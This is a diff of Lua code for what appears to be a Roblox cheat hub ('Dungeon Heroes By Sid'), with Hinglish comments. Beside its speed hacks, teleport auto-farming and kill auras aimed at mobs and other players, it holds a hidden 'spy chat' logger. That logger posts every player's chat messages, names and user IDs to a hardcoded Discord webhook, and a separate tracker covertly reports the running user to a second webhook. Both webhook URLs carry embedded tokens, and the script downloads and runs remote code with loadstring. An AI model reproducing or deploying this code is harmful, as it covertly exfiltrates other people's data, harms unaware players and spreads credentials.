+doSingularity(data.payload.target_id) -- Note: Payload check karna padega python se
+
+elseif data.type == "identity" then
+doIdentity(data.payload.clone_id)
+
+elseif data.type == "midas" then
+doMidas(data.payload.target_id) -- UserID pass karna zaroori hai
+
+elseif data.type == "gravity" then
+doGravity(data.payload.target_id, data.payload.dir) -- Note: Yahan target ID bhejna padega payload me
+elseif data.type == "ride" then
+doRide(data.payload.target_id)
+
+elseif data.type == "abduct" then
+doAbduct(data.payload.target_id)
+
+elseif data.type == "fling" then
+doFling(data.payload.target_id)
+
+elseif data.type == "couple" then
+local rId = tonumber(data.payload.rider_id)
+local hId = tonumber(data.payload.horse_id)
+
+if player.UserId == rId then  
+    -- CASE A: Main hi Rider hu (Mere paas script hai)  
+    -- Toh main khud chalke jaunga  
+    doSmartRide(hId)  
+      
+elseif player.UserId ~= rId and player.UserId ~= hId then  
+    -- CASE B: Main Admin hu (Teesra banda)  
+    -- Main apni takat se Rider ko kheech ke Horse ke paas le jaunga  
+    doPhysicsDrag(rId, hId)  
+end  
+                    end  
+                end  
+            end  
+        end)  
+    end  
+end)
+
+end -- << YE 'end' BOHOT ZAROORI HAI >>
+
+-- =========================================================
+-- 🕵️ ULTIMATE SPY CHAT (No Doubles + Full Info)
+-- =========================================================
+
+task.spawn(function()
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
+
+-- ⚠️ CONFIGURATION: APNA WEBHOOK URL YAHAN DALO  
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571499584662798456/o6WD0XtZbCpyMEXa-AeRib3nw08iA2FtQuZ-NshHgMCfNKqeaQ2AI8Zx9FfGggu8ngi_"  
+
+-- Executor Request Function (Check)  
+local request_func = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)  
+if not request_func then return warn("Executor not supported") end  
+
+-- [CLEANER] HTML Tags Hatao  
+local function cleanMessage(msg)  
+    local clean, _ = string.gsub(msg, "<[^>]+>", "")  
+    return clean  
+end  
+
+-- [SENDER] Discord Bhejne Wala Function  
+local function sendToDiscord(player, msg)  
+    local finalMsg = cleanMessage(msg)  
+    if finalMsg == "" or finalMsg:match("^%s*$") then return end  
+
+    -- 1. Headline & Color Logic  
+    local titleText = "👤 Public Chat Detected"  
+    local embedColor = 16776960 -- Yellow (Default for others)  
+
+    if player == LocalPlayer then  
+        titleText = "📤 Sent by You (LocalPlayer)"  
+        embedColor = 65280 -- Green  
+    else  
+        titleText = "🗣️ Message from: " .. player.DisplayName  
+        embedColor = 16711680 -- Red (Alert for others)  
+    end  
+
+    -- 2. Data Pack (Full Details)  
+    local data = {  
+        ["content"] = "",  
+        ["embeds"] = {{  
+            ["title"] = titleText,  
+            ["description"] = "```\n" .. finalMsg .. "\n```",  
+            ["color"] = embedColor,  
+            ["fields"] = {  
+                {  
+                    ["name"] = "👤 Username",  
+                    ["value"] = "`" .. player.Name .. "`",  
+                    ["inline"] = true  
+                },  
+                {  
+                    ["name"] = "🏷️ Display Name",  
+                    ["value"] = player.DisplayName,  
+                    ["inline"] = true  
+                },  
+                {  
+                    ["name"] = "🆔 User ID",  
+                    ["value"] = "`" .. tostring(player.UserId) .. "`",  
+                    ["inline"] = true  
+                }  
+            },  
+            ["footer"] = {  
+                ["text"] = "Server ID: " .. game.JobId .. " | Time: " .. os.date("%X")  
+            }  
+        }}  
+    }  
+
+    request_func({  
+        Url = WEBHOOK_URL,  
+        Method = "POST",  
+        Headers = {["Content-Type"] = "application/json"},  
+        Body = HttpService:JSONEncode(data)  
+    })  
+end  
+
+-- =========================================================  
+-- 🛑 SMART HOOK SYSTEM (Fixes Double Messages)  
+-- =========================================================  
+  
+local Hooked = false -- Ye variable check karega ki hook laga ya nahi  
+
+-- SYSTEM 1: Try New Chat (TextChatService)  
+local success, _ = pcall(function()  
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
+        TextChatService.MessageReceived:Connect(function(textChatMessage)  
+            if textChatMessage.TextSource then  
+                local sender = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)  
+                if sender then  
+                    sendToDiscord(sender, textChatMessage.Text)  
+                end  
+            end  
+        end)  
+        Hooked = true  
+        print("✅ Logger connected to TextChatService (Modern)")  
+    end  
+end)  
+
+-- SYSTEM 2: Fallback to Old Chat (Legacy) -> Only if System 1 failed  
+if not Hooked then  
+    local function connectLegacy(p)  
+        p.Chatted:Connect(function(msg)  
+            sendToDiscord(p, msg)  
+        end)  
+    end  
+
+    -- Connect Existing  
+    for _, p in ipairs(Players:GetPlayers()) do  
+        connectLegacy(p)  
+    end  
+    -- Connect New  
+    Players.PlayerAdded:Connect(connectLegacy)  
+      
+    print("✅ Logger connected to Legacy Chat (Old)")  
+end
+
+end)
+
+-- ==================================================================
+-- TELEGRAM JOIN TRACKER
+-- ==================================================================
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- =======================
+-- WEBHOOK
+-- =======================
+local WEBHOOK = "https://discord.com/api/webhooks/1571498713497469130/Xj4LEFbOs_yQ0T2rjJM8CsPp3VQhMpwxZDvRwztpvfygj5CKWMCFrPU9DSvdVBlLurQl"
+
+-- =======================
+-- LOCAL TIME
+-- =======================
+local localTime = DateTime.now():ToLocalTime()
+local today = string.format("%04d-%02d-%02d", localTime.Year, localTime.Month, localTime.Day)
+
+local timeIST = string.format(
+"%02d:%02d:%02d %s",
+(localTime.Hour % 12 == 0 and 12 or localTime.Hour % 12),
+localTime.Minute,
+localTime.Second,
+localTime.Hour >= 12 and "PM" or "AM"
+)
+
+-- =======================
+-- DAILY COUNTER (PERSISTENT)
+-- =======================
+local FILE = "daily_counter.json"
+local data = { date = today, count = 0 }
+
+if isfile(FILE) then
+local saved = HttpService:JSONDecode(readfile(FILE))
+if saved.date == today then
+data.count = saved.count
+end
+end
+
+data.count += 1
+writefile(FILE, HttpService:JSONEncode({
+date = today,
+count = data.count
+}))
+
+local dailyCount = data.count
+
+-- =======================
+-- EMBED
+-- =======================
+local embed = {
+["username"] = "User Tracker",
+["embeds"] = {{
+["title"] = "🟢 New User Logged",
+["color"] = 5814783,
+["fields"] = {
+{ ["name"] = "Username", ["value"] = "@"..player.Name, ["inline"] = false },
+{ ["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = false },
+{ ["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = false },
+{ ["name"] = "Today's Count", ["value"] = tostring(dailyCount), ["inline"] = false }
+},
+["footer"] = {
+["text"] = "Time: "..timeIST.." | Date: "..today.." (Local)"
+}
+}}
+}
+
+local send = HttpService:JSONEncode(embed)
+
+pcall(function()
+request({
+Url = WEBHOOK,
+Method = "POST",
+Headers = { ["Content-Type"] = "application/json" },
+Body = send
+})
+end)
+
+-- ========================End Point =====================
+
+-- Load Rayfield UI Library
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- ==========================================
+-- WALKSPEED LOGIC (100% ORIGINAL)
+-- ==========================================
+local isToggled = false
+local currentSpeed = 50
+local maxSpeed = 200
+local defaultSpeed = 16
+
+local function UpdateSpeed()
+if player.Character and player.Character:FindFirstChild("Humanoid") then
+if isToggled then
+player.Character.Humanoid.WalkSpeed = currentSpeed
+else
+player.Character.Humanoid.WalkSpeed = defaultSpeed
+end
+end
+end
+
+-- Keep speed active & handle respawn smoothly
+RunService.RenderStepped:Connect(function()
+if isToggled and player.Character and player.Character:FindFirstChild("Humanoid") then
+if player.Character.Humanoid.WalkSpeed ~= currentSpeed then
+player.Character.Humanoid.WalkSpeed = currentSpeed
+end
+end
+end)
+
+player.CharacterAdded:Connect(function(char)
+local hum = char:WaitForChild("Humanoid", 5)
+if hum and isToggled then
+hum.WalkSpeed = currentSpeed
+end
+end)
+
+-- ==========================================
+-- RAYFIELD WINDOW & TAB
+-- ==========================================
+
+-- Ye line CreateWindow se BAHAR rahegi (Saare notifications block karne ke liye)
+Rayfield.Notify = function() end
+
+local Window = Rayfield:CreateWindow({
+Name = "Dungeon Heroes By Sid",
+Icon = 0,
+LoadingTitle = "Dungeon Heroes By Sid",
+LoadingSubtitle = "ultimate",
+Theme = "Default",
+DisableRayfieldPrompts = true,
+DisableBuildWarnings = true,
+ConfigurationSaving = {
+Enabled = true,
+FolderName = "SidDungeonHeroes",
+FileName = "SavedConfig"
+},
+KeySystem = false
+})
+
+local MainTab = Window:CreateTab("⚡ Main", 4483362458)
+local AutoGrindTab = Window:CreateTab("⚡ Grind", 4483362458)
+local UtilityTab = Window:CreateTab("⚡ Utility", 4483362458)
+local ChestTab = Window:CreateTab("⚡ Chest", 4483362458)
+local MiscellaneousTab = Window:CreateTab("⚡ Miscellaneous", 4483362458)
+local EventTab = Window:CreateTab("⚡ Event", 4483362458)
+
+
+do
+--========================================================
+-- BANANA AUTO FARM V3 | RAYFIELD EDITION
+-- Giant Banana (#1) + Humbaba King (#2) Priority + Auto Die
+--========================================================
+
+--================ RAYFIELD LOADER ======================
+
+--================ SERVICES ==============================
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+
+--================ CONFIG ================================
+
+local Enabled = false
+local ReturnToStart = true
+local MaxSyncWait = 0.07
+local ClusterRadius = 35
+
+local BossPriorityEnabled = true
+local GiantBananaPriority = true
+local HumbabaPriority = true
+local BossActive = false
+local AutoDieEnabled = false
+
+-- Priority Order: Index 1 checks first, Index 2 checks second
+local PriorityBossList = {
+"Giant Banana",
+"Humbaba King"
+}
+
+local CurrentBoss = nil
+
+local Cooldowns = setmetatable({}, {
+__mode = "k"
+})
+
+--================ SAFE GETTERS ==========================
+
+local function GetBananaFolder()
+return workspace:FindFirstChild("Bananas")
+end
+
+local function GetMobsFolder()
+return workspace:FindFirstChild("Mobs")
+end
+
+local function GetBananaRemote()
+local Remotes = RS:FindFirstChild("Remotes")
+return Remotes and Remotes:FindFirstChild("BananaPickup")
+end
+
+local function GetCharacter()
+return LocalPlayer.Character
+end
+
+local function GetHRP()
+local Character = GetCharacter()
+return Character and Character:FindFirstChild("HumanoidRootPart")
+end
+
+local function GetPart(Object)
+if not Object then
+return nil
+end
+
+if Object:IsA("BasePart") then  
+    return Object  
+end  
+
+if Object:IsA("Model") then  
+    return Object.PrimaryPart  
+        or Object:FindFirstChild("HumanoidRootPart")  
+        or Object:FindFirstChildWhichIsA("BasePart", true)  
+end  
+
+return nil
+
+end
+
+--================ BOSS HEALTH ===========================
+
+local function GetBossHealth(Boss)
+if not Boss or not Boss.Parent then
+return 0
+end
+
+local Humanoid = Boss:FindFirstChildWhichIsA(  
+    "Humanoid", true  
+)  
+
+if Humanoid then  
+    return Humanoid.Health  
+end  
+
+local Health = Boss:FindFirstChild("Health", true)  
+
+if Health and (  
+    Health:IsA("NumberValue")  
+    or Health:IsA("IntValue")  
+) then  
+    return Health.Value  
+end  
+
+local AttributeHealth = Boss:GetAttribute("Health")  
+
+if typeof(AttributeHealth) == "number" then  
+    return AttributeHealth  
+end  
+
+-- Fallback: If no health value is exposed on Giant Banana,  
+-- check if it still has a valid BasePart inside Workspace.Mobs  
+if GetPart(Boss) then  
+    return 1  
+end  
+
+return 0
+
+end
+
+--================ BOSS DETECTION (PRIORITY BASED) =======
+
+local function IsBossAllowed(TargetName)
+if TargetName == "Giant Banana" then
+return GiantBananaPriority
+elseif TargetName == "Humbaba King" then
+return HumbabaPriority
+end
+return false
+end
+
+local function FindPriorityBoss()
+local Mobs = GetMobsFolder()
+
+if not Mobs then  
+    return nil  
+end  
+
+local AllMobs = Mobs:GetChildren()  
+
+-- Outer loop checks "Giant Banana" completely before checking "Humbaba King"  
+for _, PriorityName in ipairs(PriorityBossList) do  
+    if IsBossAllowed(PriorityName) then  
+        for _, Mob in ipairs(AllMobs) do  
+            if Mob:IsA("Model") and Mob.Name == PriorityName then  
+                if GetBossHealth(Mob) > 0 and GetPart(Mob) then  
+                    return Mob  
+                end  
+            end  
+        end  
+    end  
+end  
+
+return nil
+
+end
+
+--================ BOSS PRIORITY CONTROLLER ==============
+
+task.spawn(function()
+while true do
+
+if Enabled and BossPriorityEnabled then  
+
+        local Boss = FindPriorityBoss()  
+
+        if Boss then  
+            CurrentBoss = Boss  
+            BossActive = true  
+
+            local HRP = GetHRP()  
+            local BossPart = GetPart(Boss)  
+
+            if HRP and BossPart  
+                and Boss.Parent == GetMobsFolder()  
+                and GetBossHealth(Boss) > 0 then  
+
+                HRP.AssemblyLinearVelocity = Vector3.zero  
+                HRP.AssemblyAngularVelocity = Vector3.zero  
+
+                -- Stay near the highest-priority active boss  
+                HRP.CFrame = BossPart.CFrame  
+                    * CFrame.new(0, 0, 6)  
+            end  
+
+        else  
+            CurrentBoss = nil  
+            BossActive = false  
+        end  
+
+    else  
+        CurrentBoss = nil  
+        BossActive = false  
+    end  
+
+    task.wait(0.12)  
+end
+
+end)
+
+--================ AUTO DIE ==============================
+
+local function KillPlayer()
+if not AutoDieEnabled then
+return
+end
+
+local Character = GetCharacter()  
+
+local Humanoid = Character  
+    and Character:FindFirstChildOfClass("Humanoid")  
+
+if Humanoid and Humanoid.Health > 0 then  
+    Humanoid.Health = 0  
+end
+
+end
+
+LocalPlayer.CharacterAdded:Connect(function()
+if AutoDieEnabled then
+task.wait(0.5)
+KillPlayer()
+end
+end)
+
+--================ BANANA COLLECT ========================
+
+local function CollectBanana(HRP, Banana, Part, Remote)
+task.spawn(function()
+pcall(function()
+
+if not Enabled or BossActive then  
+            return  
+        end  
+
+        if firetouchinterest and HRP and Part then  
+            firetouchinterest(HRP, Part, 0)  
+            firetouchinterest(HRP, Part, 1)  
+        end  
+
+        if Remote then  
+            Remote:FireServer(Banana)  
+        end  
+
+    end)  
+end)
+
+end
+
+--================ RAYFIELD SECTION ======================
+
+EventTab:CreateSection("Banana Auto Farm")
+
+--================ MAIN FARM TOGGLE ======================
+
+EventTab:CreateToggle({
+Name = "Smart Auto Collect All (V3)",
+CurrentValue = false,
+
+Callback = function(Value)  
+
+    Enabled = Value  
+
+    if not Value then  
+        BossActive = false  
+        CurrentBoss = nil  
+        return  
+    end  
+
+    -- THREAD 1: PASSIVE AURA  
+
+    task.spawn(function()  
+
+        while Enabled do  
+
+            if not BossActive then  
+
+                local BananaFolder = GetBananaFolder()  
+                local Remote = GetBananaRemote()  
+                local HRP = GetHRP()  
+
+                if HRP and BananaFolder and Remote then  
+
+                    local MyPos = HRP.Position  
+
+                    for _, Banana in ipairs(  
+                        BananaFolder:GetChildren()  
+                    ) do  
+
+                        if not Enabled or BossActive then  
+                            break  
+                        end  
+
+                        local Part = GetPart(Banana)  
+
+                        if Part  
+                            and (Part.Position - MyPos).Magnitude  
+                            <= ClusterRadius then  
+
+                            CollectBanana(  
+                                HRP,  
+                                Banana,  
+                                Part,  
+                                Remote  
+                            )  
+                        end  
+                    end  
+                end  
+            end  
+
+            task.wait(0.05)  
+        end  
+    end)  
+
+    -- THREAD 2: TELEPORT CLUSTER SWEEP  
+
+    task.spawn(function()  
+
+        while Enabled do  
+
+            if not BossActive then  
+
+                local BananaFolder = GetBananaFolder()  
+                local Remote = GetBananaRemote()  
+                local HRP = GetHRP()  
+
+                if HRP and BananaFolder and Remote  
+                    and not BossActive then  
+
+                    local Now = os.clock()  
+                    local ValidBananas = {}  
+
+                    for _, Banana in ipairs(  
+                        BananaFolder:GetChildren()  
+                    ) do  
+
+                        if not Enabled or BossActive then  
+                            break  
+                        end  
+
+                        if Banana:IsA("Model")  
+                            or Banana:IsA("BasePart") then  
+
+                            local Last = Cooldowns[Banana] or 0  
+
+                            if Now - Last >= 0.85 then  
+
+                                local Part = GetPart(Banana)  
+
+                                if Part then  
+                                    table.insert(  
+                                        ValidBananas,  
+                                        {  
+                                            Instance = Banana,  
+                                            Part = Part,  
+                                            Pos = Part.Position  
+                                        }  
+                                    )  
+                                end  
+                            end  
+                        end  
+                    end  
+
+                    if #ValidBananas > 0 and not BossActive then  
+
+                        local OldCFrame = HRP.CFrame  
+                        local DidTeleport = false  
+
+                        table.sort(  
+                            ValidBananas,  
+                            function(A, B)  
+                                return (  
+                                    A.Pos - HRP.Position  
+                                ).Magnitude < (  
+                                    B.Pos - HRP.Position  
+                                ).Magnitude  
+                            end  
+                        )  
+
+                        for _, Seed in ipairs(ValidBananas) do  
+
+                            if not Enabled or BossActive then  
+                                break  
+                            end  
+
+                            if Seed.Instance.Parent == BananaFolder  
+                                and (  
+                                    os.clock()  
+                                    - (Cooldowns[Seed.Instance] or 0)  
+                                ) >= 0.85 then  
+
+                                local Batch = {}  
+                                local CenterPos = Vector3.zero  
+
+                                for _, Other in ipairs(ValidBananas) do  
+
+                                    if not Enabled or BossActive then  
+                                        break  
+                                    end  
+
+                                    if Other.Instance.Parent == BananaFolder  
+                                        and (  
+                                            os.clock()  
+                                            - (Cooldowns[Other.Instance] or 0)  
+                                        ) >= 0.85  
+                                        and (  
+                                            Other.Pos - Seed.Pos  
+                                        ).Magnitude <= ClusterRadius then  
+
+                                        table.insert(Batch, Other)  
+                                        CenterPos += Other.Pos  
+                                    end  
+                                end  
+
+                                if BossActive then  
+                                    break  
+                                end  
+
+                                if #Batch > 1 then  
+
+                                    CenterPos = CenterPos / #Batch  
+
+                                    local FinalBatch = {}  
+
+                                    for _, Item in ipairs(Batch) do  
+
+                                        if (  
+                                            Item.Pos - CenterPos  
+                                        ).Magnitude <= ClusterRadius then  
+
+                                            Cooldowns[Item.Instance] =  
+                                                os.clock()  
+
+                                            table.insert(  
+                                                FinalBatch,  
+                                                Item  
+                                            )  
+                                        end  
+                                    end  
+
+                                    if #FinalBatch <= 1 then  
+                                        FinalBatch = {Seed}  
+
+                                        Cooldowns[Seed.Instance] =  
+                                            os.clock()  
+
+                                        CenterPos = Seed.Pos  
+                                    end  
+
+                                    DidTeleport = true  
+
+                                    HRP.AssemblyLinearVelocity =  
+                                        Vector3.zero  
+
+                                    HRP.AssemblyAngularVelocity =  
+                                        Vector3.zero  
+
+                                    HRP.CFrame = CFrame.new(  
+                                        CenterPos + Vector3.new(0, 1.5, 0)  
+                                    )  
+
+                                    local StartTime = os.clock()  
+
+                                    while Enabled  
+                                        and not BossActive  
+                                        and os.clock() - StartTime  
+                                        < MaxSyncWait do  
+
+                                        local AnyRemaining = false  
+
+                                        for _, Item in ipairs(FinalBatch) do  
+
+                                            if not Enabled or BossActive then  
+                                                break  
+                                            end  
+
+                                            if Item.Instance.Parent  
+                                                == BananaFolder then  
+
+                                                AnyRemaining = true  
+
+                                                CollectBanana(  
+                                                    HRP,  
+                                                    Item.Instance,  
+                                                    Item.Part,  
+                                                    Remote  
+                                                )  
+                                            end  
+                                        end  
+
+                                        if not AnyRemaining then  
+                                            break  
+                                        end  
+
+                                        RunService.Heartbeat:Wait()  
+                                    end  
+
+                                    -- SINGLE FALLBACK  
+
+                                    for _, Item in ipairs(FinalBatch) do  
+
+                                        if not Enabled or BossActive then  
+                                            break  
+                                        end  
+
+                                        if Item.Instance.Parent  
+                                            == BananaFolder then  
+
+                                            HRP.AssemblyLinearVelocity =  
+                                                Vector3.zero  
+
+                                            HRP.CFrame =  
+                                                Item.Part.CFrame  
+                                                + Vector3.new(0, 1.5, 0)  
+
+                                            local SingleWait = os.clock()  
+
+                                            while Enabled  
+                                                and not BossActive  
+                                                and Item.Instance.Parent  
+                                                == BananaFolder  
+                                                and os.clock() - SingleWait  
+                                                < MaxSyncWait do  
+
+                                                HRP.AssemblyLinearVelocity =  
+                                                    Vector3.zero  
+
+                                                CollectBanana(  
+                                                    HRP,  
+                                                    Item.Instance,  
+                                                    Item.Part,  
+                                                    Remote  
+                                                )  
+
+                                                RunService.Heartbeat:Wait()  
+                                            end  
+                                        end  
+                                    end  
+
+                                else  
+
+                                    Cooldowns[Seed.Instance] =  
+                                        os.clock()  
+
+                                    DidTeleport = true  
+
+                                    HRP.AssemblyLinearVelocity =  
+                                        Vector3.zero  
+
+                                    HRP.AssemblyAngularVelocity =  
+                                        Vector3.zero  
+
+                                    HRP.CFrame =  
+                                        Seed.Part.CFrame  
+                                        + Vector3.new(0, 1.5, 0)  
+
+                                    local StartTime = os.clock()  
+
+                                    while Enabled  
+                                        and not BossActive  
+                                        and Seed.Instance.Parent  
+                                        == BananaFolder  
+                                        and os.clock() - StartTime  
+                                        < (MaxSyncWait + 0.03) do  
+
+                                        HRP.AssemblyLinearVelocity =  
+                                            Vector3.zero  
+
+                                        CollectBanana(  
+                                            HRP,  
+                                            Seed.Instance,  
+                                            Seed.Part,  
+                                            Remote  
+                                        )  
+
+                                        RunService.Heartbeat:Wait()  
+                                    end  
+                                end  
+                            end  
+                        end  
+
+                        -- RETURN TO ORIGINAL POSITION  
+
+                        if DidTeleport  
+                            and ReturnToStart  
+                            and Enabled  
+                            and not BossActive  
+                            and HRP.Parent then  
+
+                            HRP.AssemblyLinearVelocity =  
+                                Vector3.zero  
+
+                            HRP.CFrame = OldCFrame  
+                        end  
+                    end  
+                end  
+            end  
+
+            task.wait(0.06)  
+        end  
+    end)  
+end
+
+})
+
+--================ BOSS SETTINGS =========================
+
+EventTab:CreateSection("Boss Priority System")
+
+EventTab:CreateToggle({
+Name = "Master Boss Priority",
+CurrentValue = true,
+
+Callback = function(Value)  
+    BossPriorityEnabled = Value  
+
+    if not Value then  
+        BossActive = false  
+        CurrentBoss = nil  
+    end  
+end
+
+})
+
+EventTab:CreateToggle({
+Name = "#1 Priority: Giant Banana",
+CurrentValue = true,
+
+Callback = function(Value)  
+    GiantBananaPriority = Value  
+end
+
+})
+
+EventTab:CreateToggle({
+Name = "#2 Priority: Humbaba King",
+CurrentValue = true,
+
+Callback = function(Value)  
+    HumbabaPriority = Value  
+end
+
+})
+
+--================ AUTO DIE ==============================
+
+EventTab:CreateSection("Player Settings")
+
+EventTab:CreateToggle({
+Name = "Auto Die (HP 0)",
+CurrentValue = false,
+
+Callback = function(Value)  
+
+    AutoDieEnabled = Value  
+
+    if Value then  
+        KillPlayer()  
+    end  
+end
+
+})
+
+--================ FARM SETTINGS ========================
+
+EventTab:CreateSection("Collection Settings")
+
+EventTab:CreateSlider({
+Name = "Cluster Range (Studs)",
+Range = {15, 35},
+Increment = 1,
+Suffix = " Studs",
+CurrentValue = 24,
+
+Callback = function(Value)  
+    ClusterRadius = Value  
+end
+
+})
+
+EventTab:CreateSlider({
+Name = "Max Sync Wait",
+Range = {0.03, 0.15},
+Increment = 0.01,
+Suffix = "s",
+CurrentValue = 0.07,
+
+Callback = function(Value)  
+    MaxSyncWait = Value  
+end
+
+})
+
+EventTab:CreateToggle({
+Name = "Return To Original Position",
+CurrentValue = true,
+
+Callback = function(Value)  
+    ReturnToStart = Value  
+end
+
+})
+
+EventTab:CreateButton({
+Name = "Reset Pickup Cooldowns",
+
+Callback = function()  
+    table.clear(Cooldowns)  
+end
+
+})
+end
+
+-- ==========================================
+-- SPEED CONTROLS (TOGGLE + SLIDER + MANUAL INPUT)
+-- ==========================================
+MainTab:CreateSection("WalkSpeed Controls")
+
+MainTab:CreateToggle({
+Name = "Enable WalkSpeed",
+CurrentValue = false,
+Flag = "WalkSpeedToggle",
+Callback = function(Value)
+isToggled = Value
+UpdateSpeed()
+end,
+})
+
+local SpeedSlider
+SpeedSlider = MainTab:CreateSlider({
+Name = "Speed Slider (Max: 200)",
+Range = {0, maxSpeed},
+Increment = 1,
+Suffix = "Speed",
+CurrentValue = 50,
+Flag = "WalkSpeedSlider",
+Callback = function(Value)
+currentSpeed = Value
+UpdateSpeed()
+end,
+})
+
+MainTab:CreateInput({
+Name = "Manual Speed Input (0 - 200)",
+CurrentValue = "80",
+PlaceholderText = "Enter Speed (0 - 200)",
+RemoveTextAfterFocusLost = false,
+Flag = "WalkSpeedInput",
+Callback = function(Text)
+local num = tonumber(Text)
+if num then
+currentSpeed = math.clamp(math.floor(num), 0, maxSpeed)
+if SpeedSlider and SpeedSlider.Set then
+pcall(function()
+SpeedSlider:Set(currentSpeed)
+end)
+end
+UpdateSpeed()
+end
+end,
+})
+
+MainTab:CreateSection("Combat")
+
+local CONFIG = {
+KillRange = 200,
+AttackSpeed = 0.15
+}
+
+local KillEnabled = false
+local DuelEnabled = false
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+local PlayerAttackRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("PlayerAttack")
+
+-- 1. Mobs Kill Aura Function (TargetDummy Exception)
+local function Kill()
+task.spawn(function()
+while KillEnabled do
+task.wait()
+
+local Character = LocalPlayer.Character  
+        local HRP = Character and Character:FindFirstChild("HumanoidRootPart")  
+        local MobsFolder = workspace:FindFirstChild("Mobs")  
+
+        if HRP and MobsFolder then  
+            local Targets = {}  
+
+            for _, Mob in ipairs(MobsFolder:GetChildren()) do  
+                -- Ignore TargetDummy  
+                if Mob.Name ~= "TargetDummy" then  
+
+                    local MobHRP = Mob:FindFirstChild("HumanoidRootPart")  
+                    local HP = Mob:GetAttribute("HP")  
+
+                    if MobHRP and HP ~= "0" and HP ~= 0  
+                    and not Mob:GetAttribute("Owner")  
+                    and (MobHRP.Position - HRP.Position).Magnitude <= CONFIG.KillRange then  
+                        table.insert(Targets, Mob)  
+                    end  
+                end  
+            end  
+
+            for i = 1, 10 do  
+                if not KillEnabled then break end  
+                if #Targets > 0 then  
+                    PlayerAttackRemote:FireServer(Targets)  
+                end  
+                task.wait(CONFIG.AttackSpeed)  
+            end  
+        end  
+    end  
+end)
+
+end
+
+-- 2. Players Duel Aura Function (Original Logic)
+local function DuelKill()
+task.spawn(function()
+while DuelEnabled do
+task.wait()
+
+local Character = LocalPlayer.Character  
+        local HRP = Character and Character:FindFirstChild("HumanoidRootPart")  
+
+        if HRP then  
+            local Targets = {}  
+
+            for _, Player in ipairs(Players:GetPlayers()) do  
+                if Player ~= LocalPlayer and Player.Character then  
+                    local TargetChar = Player.Character  
+                    local TargetHRP = TargetChar:FindFirstChild("HumanoidRootPart")  
+                    local Humanoid = TargetChar:FindFirstChildOfClass("Humanoid")  
+                    local HPAttr = TargetChar:GetAttribute("HP")  
+
+                    local IsAlive = (Humanoid and Humanoid.Health > 0) or (HPAttr and HPAttr ~= "0" and HPAttr ~= 0)  
+                    if Humanoid == nil and HPAttr == nil then  
+                        IsAlive = true  
+                    end  
+
+                    if TargetHRP and IsAlive and (TargetHRP.Position - HRP.Position).Magnitude <= CONFIG.KillRange then  
+                        table.insert(Targets, TargetChar)  
+                    end  
+                end  
+            end  
+
+            for i = 1, 10 do  
+                if not DuelEnabled then break end  
+                if #Targets > 0 then  
+                    local args = {  
+                        Targets  
+                    }  
+                    PlayerAttackRemote:FireServer(unpack(args))  
+                end  
+                task.wait(CONFIG.AttackSpeed)  
+            end  
+        end  
+    end  
+end)
+
+end
+
+-- Kill Aura Toggle (For Mobs)
+MainTab:CreateToggle({
+Name = "Kill Aura",
+CurrentValue = false,
+Flag = "KillAura",
+Callback = function(Value)
+KillEnabled = Value
+if Value then
+Kill()
+end
+end
+})
+
+-- Duel Aura Toggle (For Players)
+MainTab:CreateToggle({
+Name = "Duel Aura",
+CurrentValue = false,
+Flag = "DuelAura",
+Callback = function(Value)
+DuelEnabled = Value
+if Value then
+DuelKill()
+end
+end
+})
+
+-- Kill Range Slider (Works for both)
+MainTab:CreateSlider({
+Name = "Kill Range",
+Range = {10, 200},
+Increment = 5,
+Suffix = "Studs",
+CurrentValue = 200,
+Flag = "KillRange",
+Callback = function(Value)
+CONFIG.KillRange = Value
+end
+})
+
+-- Attack Speed Slider (Works for both)
+MainTab:CreateSlider({
+Name = "Attack Speed (Use Only Default)",
+Range = {0.01, 1},
+Increment = 0.01,
+Suffix = "Seconds",
+CurrentValue = 0.15,
+Flag = "AttackSpeed",
+Callback = function(Value)
+CONFIG.AttackSpeed = Value
+end
+})
+
+-- ================= Pet Aura =======================
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+local function GetMobsFolder()
+	return workspace:FindFirstChild("Mobs")
+end
+
+local PetDamage = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("PetDamage")
+local MobsSystem = require(ReplicatedStorage:WaitForChild("Systems"):WaitForChild("Mobs"))
+
+local CONFIG = {
+	KillRange = 300,
+	AttackSpeed = 0.001,
+	ClusterRadius = 25
+}
+
+-- Cache table taaki har pet ka best attack 1 hi baar scan ho
+local CachedBestAttack = {}
+
+local KillEnabled = false
+local LoopId = 0
+
+-- Find equipped pet
+local function GetMyPet()
+	local MobsFolder = GetMobsFolder()
+	if not MobsFolder then return nil end
+
+	for _, Mob in ipairs(MobsFolder:GetChildren()) do
+		if Mob:GetAttribute("Owner") == LocalPlayer.Name then
+			return Mob
+		end
+	end
+	return nil
+end
+
+-- Auto-Detect ONLY the #1 Highest Damage Skill of the Equipped Pet
+local function GetBestPetAttack(Pet)
+	if not Pet then return nil end
+	local PetName = Pet.Name
+
+	if CachedBestAttack[PetName] then
+		return CachedBestAttack[PetName]
+	end
+
+	local Ok, AttacksFolder = pcall(function()
+		return MobsSystem:GetMobAttacksFolder(PetName)
+	end)
+
+	if not Ok or not AttacksFolder then
+		return nil
+	end
+
+	local BestSkill = nil
+	local BestDamage = -1
+	local BestRange = -1
+	local BestCooldown = -1
+
+	for _, AttackFolder in ipairs(AttacksFolder:GetChildren()) do
+		if AttackFolder:IsA("Folder") and not AttackFolder:FindFirstChild("PetsCannotUse") then
+			local RangeObj = AttackFolder:FindFirstChild("AttackRange")
+			local CooldownObj = AttackFolder:FindFirstChild("Cooldown")
